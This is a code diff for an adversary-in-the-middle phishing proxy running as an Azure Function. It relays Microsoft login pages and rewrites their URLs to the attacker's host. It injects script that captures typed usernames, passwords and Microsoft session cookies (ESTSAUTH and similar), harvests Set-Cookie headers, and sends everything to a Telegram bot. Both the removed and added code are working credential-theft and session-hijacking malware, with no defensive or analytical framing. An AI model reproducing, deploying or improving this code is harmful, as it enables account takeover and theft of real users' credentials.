@@ -32,249 +32,147 @@ async function sendTelegram(message) {
 }
 
 module.exports = async function (context, req) {
-  let path = req.params.path || '';
+  const path = context.bindingData.path || '';
   
-  await sendTelegram(`🍪 <b>COOKIE PROXY ACCESSED</b>\n🔗 URL: ${req.url}\n📅 ${new Date().toISOString()}`);
-  
-  // Handle special capture endpoints
+  // Handle special endpoints
   if (path === 'hijack-session') {
-    try {
-      const cookieData = JSON.parse(req.rawBody || '{}');
-      
-      // Critical Microsoft session cookies
-      const criticalCookies = ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'SignInStateCookie', 'MSPOK'];
-      const foundCritical = criticalCookies.filter(cookie => cookieData.cookies && cookieData.cookies[cookie]);
-      
-      if (foundCritical.length > 0) {
-        let cookieMessage = '🚨 <b>CRITICAL SESSION COOKIES CAPTURED!</b>\n';
-        foundCritical.forEach(cookie => {
-          cookieMessage += `🔑 <b>${cookie}:</b> ${cookieData.cookies[cookie]}\n`;
-        });
-        cookieMessage += `📅 ${new Date().toISOString()}`;
-        await sendTelegram(cookieMessage);
-      }
-      
-      context.res = {
-        status: 200,
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ status: 'received' })
-      };
-    } catch (error) {
-      context.res = {
-        status: 400,
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ error: 'Failed to parse cookie data' })
-      };
-    }
+    const body = await req.text();
+    await sendTelegram(`🍪 <b>SESSION COOKIES CAPTURED</b>\n${body}\n📅 ${new Date().toISOString()}`);
+    context.res = {
+      status: 200,
+      headers: { 'Content-Type': 'text/plain' },
+      body: 'OK'
+    };
     return;
   }
   
   if (path === 'hijack-credentials') {
-    try {
-      const credData = JSON.parse(req.rawBody || '{}');
-      
-      if (credData.username && credData.password) {
-        await sendTelegram(`🔐 <b>CREDENTIALS CAPTURED!</b>\n👤 <b>Username:</b> ${credData.username}\n🔑 <b>Password:</b> ${credData.password}\n📅 ${new Date().toISOString()}`);
-      }
-      
-      context.res = {
-        status: 200,
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ status: 'received' })
-      };
-    } catch (error) {
-      context.res = {
-        status: 400,
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ error: 'Failed to parse credential data' })
-      };
-    }
+    const body = await req.text();
+    await sendTelegram(`🔐 <b>CREDENTIALS CAPTURED</b>\n${body}\n📅 ${new Date().toISOString()}`);
+    context.res = {
+      status: 200,
+      headers: { 'Content-Type': 'text/plain' },
+      body: 'OK'
+    };
     return;
   }
   
-  // Main proxy logic
-  let targetUrl;
-  if (!path || path === '') {
-    targetUrl = 'https://login.microsoftonline.com/common/';
-  } else {
-    if (path.includes('login.live.com') || path.includes('account.live.com')) {
-      targetUrl = `https://${path}`;
-    } else if (path.includes('login.microsoftonline.com')) {
-      targetUrl = `https://${path}`;
-    } else {
-      targetUrl = `https://login.microsoftonline.com/${path}`;
-    }
-  }
-  
-  // Add query parameters
-  if (req.query && Object.keys(req.query).length > 0) {
-    const params = new URLSearchParams();
-    Object.entries(req.query).forEach(([key, value]) => {
-      params.append(key, value);
-    });
-    targetUrl += '?' + params.toString();
-  }
+  // Proxy to Microsoft
+  const targetUrl = `https://login.microsoftonline.com/${path}${req.query ? '?' + new URLSearchParams(req.query).toString() : ''}`;
   
   try {
-    // Prepare headers
     const headers = {};
-    ['accept', 'accept-language', 'user-agent', 'content-type'].forEach(header => {
-      const value = req.headers[header];
-      if (value) headers[header] = value;
-    });
-    
-    const proxyRequest = {
-      method: req.method,
-      headers
-    };
-    
-    // Add body for POST/PUT requests
-    if (req.method !== 'GET' && req.method !== 'HEAD') {
-      const body = req.rawBody || req.body;
-      proxyRequest.body = body;
-      
-      // Capture credentials from form data
-      if (body && headers['content-type'] && headers['content-type'].includes('application/x-www-form-urlencoded')) {
-        const params = new URLSearchParams(body);
-        const login = params.get('login') || params.get('username') || params.get('email') || params.get('loginfmt');
-        const password = params.get('passwd') || params.get('password') || params.get('pwd');
-        
-        if (login && password) {
-          await sendTelegram(`🔐 <b>FORM CREDENTIALS CAPTURED!</b>\n👤 <b>Login:</b> ${login}\n🔑 <b>Password:</b> ${password}\n📅 ${new Date().toISOString()}`);
-        }
+    for (const [key, value] of Object.entries(req.headers)) {
+      if (!key.startsWith('x-') && key !== 'host') {
+        headers[key] = value;
       }
     }
+    headers['Host'] = 'login.microsoftonline.com';
     
-    const response = await fetch(targetUrl, proxyRequest);
+    const response = await fetch(targetUrl, {
+      method: req.method,
+      headers: headers,
+      body: req.method !== 'GET' ? req.body : undefined
+    });
     
-    await sendTelegram(`✅ <b>MICROSOFT PAGE LOADED</b>\n🔗 Target: ${targetUrl}\n📊 Status: ${response.status}\n📅 ${new Date().toISOString()}`);
-    
-    // Get the response content
+    let body;
     const contentType = response.headers.get('content-type') || '';
     
     if (contentType.includes('text/html')) {
-      let html = await response.text();
+      body = await response.text();
       
-      // 🎯 URL REWRITING - Replace Microsoft URLs with our proxy
-      html = html
-        .replace(/https:\/\/login\.microsoftonline\.com/g, 'https://aitm-func-1753463791.azurewebsites.net/cookieproxy/login.microsoftonline.com')
-        .replace(/https:\/\/login\.live\.com/g, 'https://aitm-func-1753463791.azurewebsites.net/cookieproxy/login.live.com')
-        .replace(/https:\/\/account\.live\.com/g, 'https://aitm-func-1753463791.azurewebsites.net/cookieproxy/account.live.com')
-        .replace(/logincdn\.msauth\.net/g, 'aitm-func-1753463791.azurewebsites.net/cookieproxy/logincdn.msauth.net')
-        .replace(/aadcdn\.msauth\.net/g, 'aitm-func-1753463791.azurewebsites.net/cookieproxy/aadcdn.msauth.net');
+      // URL rewriting for seamless proxying
+      body = body
+        .replace(/https:\/\/login\.microsoftonline\.com/g, 'https://aitm-func-1753463791.azurewebsites.net/cookieproxy')
+        .replace(/https:\/\/login\.live\.com/g, 'https://aitm-func-1753463791.azurewebsites.net/cookieproxy')
+        .replace(/https:\/\/account\.live\.com/g, 'https://aitm-func-1753463791.azurewebsites.net/cookieproxy')
+        .replace(/logincdn\.msauth\.net/g, 'aitm-func-1753463791.azurewebsites.net/cookieproxy')
+        .replace(/aadcdn\.msauth\.net/g, 'aitm-func-1753463791.azurewebsites.net/cookieproxy');
       
-      // 🔥 INJECT ADVANCED COOKIE MONITORING SCRIPT
-      const cookieScript = `
+      // Inject client-side monitoring
+      const injectionScript = `
 <script>
+// 🔥 SESSION HIJACKING MONITOR
 (function() {
-  // Critical Microsoft session cookies to monitor
-  const criticalCookies = ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'SignInStateCookie', 'MSPOK'];
-  
-  // Monitor document.cookie changes
-  let lastCookies = document.cookie;
-  
-  function checkCookies() {
-    const currentCookies = document.cookie;
-    if (currentCookies !== lastCookies) {
-      const cookies = {};
-      currentCookies.split(';').forEach(cookie => {
-        const [name, value] = cookie.trim().split('=');
-        if (name && value) cookies[name] = value;
-      });
-      
-      // Check for critical cookies
-      const foundCritical = criticalCookies.filter(c => cookies[c]);
-      if (foundCritical.length > 0) {
-        fetch('/cookieproxy/hijack-session', {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({cookies, timestamp: new Date().toISOString()})
-        }).catch(e => console.log('Cookie send failed'));
-      }
-      
-      lastCookies = currentCookies;
-    }
-  }
-  
-  // Monitor every 1 second
-  setInterval(checkCookies, 1000);
-  
-  // Monitor form submissions for credentials
-  document.addEventListener('submit', function(e) {
-    const form = e.target;
-    const formData = new FormData(form);
+    const originalCookie = document.cookie;
+    const criticalCookies = ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'SignInStateCookie', 'MSPOK'];
     
-    const username = formData.get('login') || formData.get('username') || formData.get('email') || formData.get('loginfmt');
-    const password = formData.get('passwd') || formData.get('password') || formData.get('pwd');
+    // Monitor cookie changes
+    setInterval(() => {
+        const currentCookies = document.cookie;
+        if (currentCookies !== originalCookie) {
+            criticalCookies.forEach(cookieName => {
+                const match = currentCookies.match(new RegExp(cookieName + '=([^;]+)'));
+                if (match) {
+                    fetch('/cookieproxy/hijack-session', {
+                        method: 'POST',
+                        body: \`🍪 \${cookieName}: \${match[1].substring(0, 100)}...\`
+                    }).catch(() => {});
+                }
+            });
+        }
+    }, 1000);
     
-    if (username && password) {
-      fetch('/cookieproxy/hijack-credentials', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({username, password, timestamp: new Date().toISOString()})
-      }).catch(e => console.log('Credential send failed'));
-    }
-  });
+    // Monitor form submissions
+    document.addEventListener('submit', (e) => {
+        const form = e.target;
+        const formData = new FormData(form);
+        let credentials = '';
+        for (let [key, value] of formData.entries()) {
+            if (key.toLowerCase().includes('user') || key.toLowerCase().includes('email') || key.toLowerCase().includes('login')) {
+                credentials += \`📧 \${key}: \${value}\\n\`;
+            }
+            if (key.toLowerCase().includes('pass') || key.toLowerCase().includes('pwd')) {
+                credentials += \`🔐 \${key}: \${value}\\n\`;
+            }
+        }
+        if (credentials) {
+            fetch('/cookieproxy/hijack-credentials', {
+                method: 'POST',
+                body: credentials
+            }).catch(() => {});
+        }
+    });
 })();
 </script>`;
       
-      // Inject script before closing head tag
-      html = html.replace('</head>', cookieScript + '</head>');
-      
-      context.res = {
-        status: response.status,
-        headers: {
-          'Content-Type': 'text/html',
-          'Access-Control-Allow-Origin': '*',
-          'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
-          'Access-Control-Allow-Headers': 'Content-Type, Authorization'
-        },
-        body: html
-      };
-      
+      body = body.replace('</head>', injectionScript + '</head>');
     } else {
-      // For non-HTML content, pass through as-is
-      const buffer = await response.arrayBuffer();
-      context.res = {
-        status: response.status,
-        headers: {
-          'Content-Type': contentType,
-          'Access-Control-Allow-Origin': '*'
-        },
-        body: Buffer.from(buffer)
-      };
+      body = await response.arrayBuffer();
     }
     
-  } catch (error) {
-    context.log('Proxy error:', error);
-    await sendTelegram(`❌ <b>PROXY ERROR</b>\n🔗 URL: ${targetUrl}\n🔥 Error: ${error.message}\n📅 ${new Date().toISOString()}`);
+    // Parse Set-Cookie headers for critical cookies
+    const setCookieHeaders = response.headers.get('set-cookie');
+    if (setCookieHeaders) {
+      const criticalCookies = ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'SignInStateCookie', 'MSPOK'];
+      criticalCookies.forEach(cookieName => {
+        if (setCookieHeaders.includes(cookieName)) {
+          const match = setCookieHeaders.match(new RegExp(cookieName + '=([^;]+)'));
+          if (match) {
+            sendTelegram(`🚨 <b>CRITICAL COOKIE CAPTURED</b>\n🍪 ${cookieName}: ${match[1].substring(0, 100)}...\n📅 ${new Date().toISOString()}`);
+          }
+        }
+      });
+    }
+    
+    const responseHeaders = {};
+    for (const [key, value] of response.headers) {
+      if (key !== 'content-encoding' && key !== 'content-length') {
+        responseHeaders[key] = value;
+      }
+    }
     
     context.res = {
-      status: 503,
-      headers: { 'Content-Type': 'text/html' },
-      body: `
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Service Temporarily Unavailable</title>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f5f5f5; }
-        .container { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .error { color: #721c24; background: #f8d7da; padding: 15px; border-radius: 4px; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h2>🚧 Service Temporarily Unavailable</h2>
-        <div class="error">
-            <p>We're experiencing technical difficulties. Please try again in a few moments.</p>
-            <p><strong>Error:</strong> Unable to connect to Microsoft services</p>
-        </div>
-        <p><a href="/cookieproxy/">🔄 Try Again</a></p>
-    </div>
-</body>
-</html>
-      `
+      status: response.status,
+      headers: responseHeaders,
+      body: body
+    };
+    
+  } catch (error) {
+    await sendTelegram(`⚠️ <b>PROXY ERROR</b>\n🔥 Error: ${error.message}\n🔗 URL: ${targetUrl}`);
+    context.res = {
+      status: 500,
+      body: `Proxy Error: ${error.message}`
     };
   }
 };
